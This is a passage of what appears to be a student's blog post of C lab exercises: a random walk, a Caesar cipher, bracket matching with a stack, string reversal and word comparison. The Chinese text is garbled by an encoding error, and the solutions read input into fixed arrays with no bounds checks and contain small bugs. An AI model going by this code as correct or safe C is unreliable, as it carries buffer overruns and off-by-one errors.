class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span> &gt;= <span class="hljs-number">0</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] - <span class="hljs-number">1</span>] = alphabet[index];<br>            begin[<span class="hljs-number">1</span>] -= <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>        <span class="hljs-comment">// printf(&quot;%d %c\n&quot;, begin[1], Map[begin[0]][begin[1] + 1]);</span><br>        <span class="hljs-keyword">if</span> (begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span> &lt; <span class="hljs-number">10</span> &amp;&amp; Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>)<br>        &#123;<br>            Map[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>] + <span class="hljs-number">1</span>] = alphabet[index];<br>            begin[<span class="hljs-number">1</span>] += <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-keyword">return</span> boom != <span class="hljs-number">4</span> ? SelectToward(begin, Map, (toward + <span class="hljs-number">1</span>) % <span class="hljs-number">4</span>, index, boom) : <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">RandomWalk</span><span class="hljs-params">(<span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>], <span class="hljs-type">char</span> Map[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>])</span><br>&#123;<br>    <span class="hljs-type">time_t</span> t;<br>    srand((<span class="hljs-type">unsigned</span>)time(&amp;t));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">26</span>; i++)<br>    &#123;<br>        <span class="hljs-type">int</span> toward = rand() % <span class="hljs-number">4</span>;<br>        <span class="hljs-type">int</span> result = SelectToward(begin, Map, toward, i, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (result)<br>        &#123;<br>            <span class="hljs-comment">// PrintMap(Map);</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// PrintMap(Map);</span><br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> walkMap[<span class="hljs-number">10</span>][<span class="hljs-number">10</span>] = &#123;&#123;<span class="hljs-string">&#x27;.&#x27;</span>&#125;&#125;;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++)<br>        &#123;<br>            walkMap[i][j] = <span class="hljs-string">&#x27;.&#x27;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">time_t</span> t;<br>    srand((<span class="hljs-type">unsigned</span>)time(&amp;t));<br>    <span class="hljs-type">int</span> begin[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">0</span>, <span class="hljs-number">0</span>&#125;;<br>    walkMap[begin[<span class="hljs-number">0</span>]][begin[<span class="hljs-number">1</span>]] = <span class="hljs-string">&#x27;A&#x27;</span>;<br>    <span class="hljs-comment">// PrintMap(walkMap);</span><br>    RandomWalk(begin, walkMap);<br>    PrintMap(walkMap);<br>    <span class="hljs-comment">// printf(&quot;%d %c\n&quot;, begin[1], walkMap[11][1]);</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åŠ å¯†ï¼ˆEncryptionï¼‰"><a href="#åŠ å¯†ï¼ˆEncryptionï¼‰" class="headerlink" title="åŠ å¯†ï¼ˆEncryptionï¼‰"></a>åŠ å¯†ï¼ˆEncryptionï¼‰</h3><blockquote><p>å·²çŸ¥çš„æœ€å¤è€çš„ä¸€ç§åŠ å¯†æŠ€æœ¯æ˜¯å‡¯æ’’åŠ å¯†ï¼ˆå¾—åäº Julius caesarï¼‰ã€‚è¯¥æ–¹æ³•æŠŠä¸€æ¡æ¶ˆæ¯ä¸­çš„æ¯ä¸ªå­—æ¯ç”¨å­—æ¯è¡¨ä¸­å›ºå®šè·ç¦»ä¹‹åçš„é‚£ä¸ªå­—æ¯æ¥æ›¿ä»£ã€‚ï¼ˆå¦‚æœè¶Šè¿‡äº†å­—æ¯Zï¼Œä¼šç»•å›åˆ°å­—æ¯è¡¨çš„èµ·å§‹ä½ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ¯ä¸ªå­—æ¯éƒ½ç”¨å­—æ¯è¡¨ä¸­ä¸¤ä¸ªä½ç½®ä¹‹åçš„å­—æ¯ä»£æ›¿ï¼Œé‚£ä¹ˆYå°±è¢«æ›¿æ¢ä¸ºAï¼ŒZå°±è¢«æ›¿æ¢ä¸ºBã€‚ï¼‰</p><p>ç¼–å†™ç¨‹åºç”¨å‡¯æ’’åŠ å¯†æ–¹æ³•å¯¹æ¶ˆæ¯è¿›è¡ŒåŠ å¯†ã€‚ç”¨æˆ·è¾“å…¥å¾…åŠ å¯†çš„æ¶ˆæ¯å’Œç§»ä½è®¡æ•°ï¼ˆå­—æ¯ç§»åŠ¨çš„ä½ç½®æ•°â½¬ï¼‰ï¼š</p><blockquote><p>Enter message to be encrypted: Go ahead, make my day.<br>Enter shift amount (1-25): 3<br>Encrypted message: Jr dkhdg, pdnh pb gdb.</p></blockquote><p>æ³¨æ„,å½“â½¤æˆ·è¾“â¼Š26ä¸ç§»ä½è®¡æ•°çš„å·®å€¼æ—¶,ç¨‹åºå¯ä»¥å¯¹æ¶ˆæ¯è¿›â¾è§£å¯†:</p><blockquote><p>Enter message to be encrypted: Jr dkhdg, pdnh pb gdb.<br>Enter shift amount (1-25): 23<br>Encrypted message: Go ahead, make my day</p></blockquote><p>ä¸æ˜¯å­—æ¯çš„é‚£äº›å­—ç¬¦ä¸è¦æ”¹åŠ¨ã€‚æ­¤å¤–ï¼ŒåŠ å¯†æ—¶ä¸è¦æ”¹å˜å­—æ¯çš„å¤§å°å†™ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter message to be encrypted: Hello, world!<br>Enter shift amount (1-25): 3<br>Encrypted message: Khoor, zruog!</p></blockquote><blockquote><p>Enter message to be encrypted: Khoor, zruog!<br>Enter shift amount (1-25): 23<br>Encrypted message: Hello, world!</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;ctype.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">50</span>];<br>    <span class="hljs-type">int</span> amounts;<br>    fgets(str, <span class="hljs-keyword">sizeof</span>(str), <span class="hljs-built_in">stdin</span>);<br>    fflush(<span class="hljs-built_in">stdin</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;amounts);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(str); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (str[i] &gt; <span class="hljs-number">64</span> &amp;&amp; str[i] &lt; <span class="hljs-number">91</span>)<br>        &#123;<br>            str[i] = (str[i] + amounts) &gt; <span class="hljs-number">90</span> ? <span class="hljs-number">64</span> + ((str[i] + amounts) - <span class="hljs-number">90</span>) : (str[i] + amounts);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (str[i] &gt; <span class="hljs-number">96</span> &amp;&amp; str[i] &lt; <span class="hljs-number">123</span>)<br>        &#123;<br><br>            str[i] = (str[i] + amounts) &gt; <span class="hljs-number">122</span> ? <span class="hljs-number">96</span> + ((str[i] + amounts) - <span class="hljs-number">122</span>) : (str[i] + amounts);<br>        &#125;<br>        <span class="hljs-built_in">putchar</span>(str[i]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®éªŒå››"><a href="#å®éªŒå››" class="headerlink" title="å®éªŒå››"></a>å®éªŒå››</h2><h3 id="æ ˆï¼ˆStackï¼‰"><a href="#æ ˆï¼ˆStackï¼‰" class="headerlink" title="æ ˆï¼ˆStackï¼‰"></a>æ ˆï¼ˆStackï¼‰</h3><blockquote><p>ä¿®æ”¹å¦‚ä¸‹ç¨‹åºï¼Œä½¿å®ƒå­˜å‚¨å­—ç¬¦è€Œä¸æ˜¯æ•´æ•°ã€‚</p><p>å¢åŠ  main å‡½æ•°ï¼Œç”¨æ¥è¦æ±‚ç”¨æˆ·è¾“å…¥ä¸€ä¸²åœ†æ‹¬å·æˆ–èŠ±æ‹¬å·ï¼Œç„¶åæŒ‡å‡ºå®ƒä»¬ä¹‹é—´çš„åµŒå¥—æ˜¯å¦æ­£ç¡®ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter parentheses and&#x2F;or braces: <code>()(&#123;&#125;)(&#123;&#125;)</code><br>Parentheses&#x2F;braces are nested properly</p></blockquote><blockquote><p>Enter parentheses and&#x2F;or braces: <code>((&#125;</code><br>Parentheses&#x2F;braces are NOT nested properly</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span> <span class="hljs-comment">/* C99 only */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STACK_SIZE 100</span><br><br><span class="hljs-comment">/* external variables */</span><br><span class="hljs-type">char</span> contents[STACK_SIZE];<br><span class="hljs-type">int</span> top = <span class="hljs-number">0</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stack_overflow</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack overflow\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stack_underflow</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Stack underflow\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">make_empty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    top = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">is_empty</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> top == <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">bool</span> <span class="hljs-title function_">is_full</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> top == STACK_SIZE;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(<span class="hljs-type">char</span> ch)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (is_full())<br>        stack_overflow();<br>    <span class="hljs-keyword">else</span><br>        contents[top++] = ch;<br>&#125;<br><br><span class="hljs-type">char</span> <span class="hljs-title function_">pop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (is_empty())<br>        stack_underflow();<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> contents[--top];<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* prevents compiler warning due to stack_underflow() call */</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;(&#x27;</span> || ch == <span class="hljs-string">&#x27;[&#x27;</span> || ch == <span class="hljs-string">&#x27;&#123;&#x27;</span>)<br>        &#123;<br>            push(ch);<br>        &#125;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;)&#x27;</span> || ch == <span class="hljs-string">&#x27;]&#x27;</span> || ch == <span class="hljs-string">&#x27;&#125;&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (is_empty())<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are NOT nested properly&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>            <span class="hljs-type">char</span> a = pop();<br>            <span class="hljs-keyword">if</span> ((ch == <span class="hljs-string">&#x27;)&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;(&#x27;</span>) || (ch == <span class="hljs-string">&#x27;]&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;[&#x27;</span>) || (ch == <span class="hljs-string">&#x27;&#125;&#x27;</span> &amp;&amp; a != <span class="hljs-string">&#x27;&#123;&#x27;</span>))<br>            &#123;<br>                top++;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (top == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are nested properly&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Parentheses/braces are NOT nested properly&quot;</span>);<br>    &#125;<br>    make_empty();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="é€†åºï¼ˆReversalï¼‰"><a href="#é€†åºï¼ˆReversalï¼‰" class="headerlink" title="é€†åºï¼ˆReversalï¼‰"></a>é€†åºï¼ˆReversalï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºè¯»ä¸€æ¡æ¶ˆæ¯ï¼Œç„¶åé€†åºæ‰“å°å‡ºè¿™æ¡æ¶ˆæ¯ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹ï¼š</strong></em></p><blockquote><p>Enter a message: Donâ€™t get mad, get even.<br>Reversal is: .neve teg ,dam teg tâ€™noD</p></blockquote><blockquote><p>Enter a message: Hello, world!<br>Reversal is: !dlrow ,olleH</p></blockquote><p>æç¤ºï¼šä¸€æ¬¡è¯»å–æ¶ˆæ¯ä¸­çš„ä¸€ä¸ªå­—ç¬¦ï¼ˆç”¨getcharå‡½æ•°ï¼‰ï¼Œå¹¶ä¸”æŠŠè¿™äº›å­—ç¬¦å­˜å‚¨åœ¨æ•°ç»„ä¸­ï¼Œå½“æ•°ç»„å†™æ»¡æˆ–è€…è¯»åˆ°å­—ç¬¦ â€˜\nâ€™ æ—¶åœæ­¢è¯»å…¥ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> ch, arr[<span class="hljs-number">50</span>];<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> ((ch = getchar()) != <span class="hljs-string">&#x27;\n&#x27;</span>)<br>    &#123;<br>        arr[i] = ch;<br>        i++;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = i; j &gt; <span class="hljs-number">-1</span>; j--)<br>    &#123;<br>        <span class="hljs-built_in">putchar</span>(arr[j]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æœ€å¤§æœ€å°å•è¯ç®€ç•¥ç‰ˆï¼ˆThe-Biggest-and-Smallest-Wordsï¼‰"><a href="#æœ€å¤§æœ€å°å•è¯ç®€ç•¥ç‰ˆï¼ˆThe-Biggest-and-Smallest-Wordsï¼‰" class="headerlink" title="æœ€å¤§æœ€å°å•è¯ç®€ç•¥ç‰ˆï¼ˆThe Biggest and Smallest Wordsï¼‰"></a>æœ€å¤§æœ€å°å•è¯ç®€ç•¥ç‰ˆï¼ˆThe Biggest and Smallest Wordsï¼‰</h3><blockquote><p>ç¼–å†™ç¨‹åºæ‰¾å‡ºä¸€ç»„å•è¯ä¸­â€œæœ€å°â€å•è¯å’Œâ€œæœ€å¤§â€å•è¯ã€‚</p><p>ç”¨æˆ·è¾“å…¥å•è¯åï¼Œç¨‹åºæ ¹æ®å­—å…¸é¡ºåºå†³å®šæ’åœ¨æœ€å‰é¢å’Œæœ€åé¢çš„å•è¯ã€‚</p><p>å½“ç”¨æˆ·è¾“å…¥4ä¸ªå­—æ¯çš„å•è¯æ—¶ï¼Œç¨‹åºåœæ­¢è¯»å…¥ã€‚å‡è®¾æ‰€æœ‰å•è¯éƒ½ä¸è¶…è¿‡20ä¸ªå­—æ¯ã€‚</p><p><em><strong>è¾“å‡ºèŒƒä¾‹1</strong>ï¼š</em></p><blockquote><p>Enter word: dog<br>Enter word: zebra<br>Enter word: rabbit<br>Enter word: catfish<br>Enter word: walrus<br>Enter word: cat<br>Enter word: fish</p><p>Smallest word: cat<br>Largest word zebra</p></blockquote><p><em><strong>è¾“å‡ºèŒƒä¾‹2ï¼š</strong></em></p><blockquote><p>Enter word: computer<br>Enter word: ink<br>Enter word: light<br>Enter word: bookrack<br>Enter word: book</p><p>Smallest word: book<br>Largest word: light</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">isMin</span><span class="hljs-params">(<span class="hljs-type">char</span> chNew[], <span class="hljs-type">char</span> chOld[])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(chNew); i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (chNew[i] &lt; chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (chNew[i] != chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">isMax</span><span class="hljs-params">(<span class="hljs-type">char</span> chNew[], <span class="hljs-type">char</span> chOld[])</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">strlen</span>(chNew); i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (chNew[i] &gt; chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (chNew[i] != chOld[i])<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">getSmallest</span><span class="hljs-params">(<span class="hljs-type">char</span> words[][<span class="hljs-number">30</span>], <span class="hljs-type">int</span> counts)</span><br>&#123;<br>    <span class="hljs-type">int</span> record = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; counts; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (isMin(words[i], words[record]))<br>        &#123;<br>            record = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printf(words[record]);</span><br>    <span class="hljs-keyword">return</span> words[record];<br>&#125;<br><span class="hljs-type">char</span> *<span class="hljs-title function_">getBiggest</span><span class="hljs-params">(<span class="hljs-type">char</span> words[][<span class="hljs-number">30</span>], <span class="hljs-type">int</span> counts)</span><br>&#123;<br>    <span class="hljs-type">int</span> record = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; counts; i++)<br>    &#123;<br><br>        <span class="hljs-keyword">if</span> (isMax(words[i], words[record]))<br>        &#123;<br>            record = i;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// printf(words[record]);</span><br>    <span class="hljs-keyword">return</span> words[record];<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> words[<span class="hljs-number">30</span>][<span class="hljs-number">30</span>];<br>    <span class="hljs-type">int</span> len = <span class="hljs-number">0</span>, counts = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (len != <span class="hljs-number">4</span>)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, words[counts++]);<br>        len = <span class="hljs-built_in">strlen</span>(words[counts - <span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// words[counts++] = ch;</span><br>        <span class="hljs-comment">//  foundSmallest(len);</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Smallest word: %s\n&quot;</span>, getSmallest(words, counts));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Largest word: %s&quot;</span>, getBiggest(words, counts));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="å®éªŒäº”"><a href="#å®éªŒäº”" class="headerlink" title="å®éªŒäº”"></a>å®éªŒäº”</h2><h3 id="01-mainå‡½æ•°æ”¹é€ ã€‚"><a href="#01-mainå‡½æ•°æ”¹é€ ã€‚" class="headerlink" title="01 mainå‡½æ•°æ”¹é€ ã€‚"></a>01 mainå‡½æ•°æ”¹é€ ã€‚</h3><blockquote><p>ä¿®æ”¹<a href="https://icoding.run/static/inventory.c">inventory.c (ç‚¹å‡»ä¸‹è½½</a>)ç¨‹åºï¼Œä½¿ inventory å’Œ num_parts ä¸º main å‡½æ•°çš„å±€éƒ¨å˜é‡ã€‚</p><p>æœ¬å°é¢˜åªéœ€å®Œæˆ <strong>main</strong> å‡½æ•°çš„æ”¹é€ å³å¯ï¼Œç›¸å…³ç»“æ„åŠå‡½æ•°å£°æ˜å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 